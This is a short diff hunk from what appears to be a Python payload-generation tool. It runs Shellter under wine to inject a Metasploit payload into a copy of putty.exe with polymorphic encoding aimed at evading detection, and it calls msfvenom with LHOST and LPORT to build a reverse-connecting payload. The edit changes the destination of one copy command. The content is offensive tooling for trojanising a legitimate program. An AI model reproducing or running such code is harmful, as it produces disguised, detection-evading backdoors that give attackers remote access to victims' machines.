@@ -202,7 +202,7 @@ elif payloadformat == 'exe':
 
 			os.system("wine "+shellterdir+"shellter.exe -f "+shellterpayloadexe+" -p "+msfpay+" --encode --handler iat --polyiat --polyDecoder")
 			shellterputtyback = shellterdir+"putty.exe"
-			os.system ("cp %s %s" % (shellterputtyback, outputloc))
+			os.system ("cp %s %s" % (shellterputtyback, msfpay))
 	else:
 		with open(outputloc + outputname, "w") as outfile:
 			subprocess.call('msfvenom -f ' + payloadformat + ' -p ' + payload + ' LHOST=' + ipaddr + ' LPORT=' + lport, shell=True, stdout=outfile)
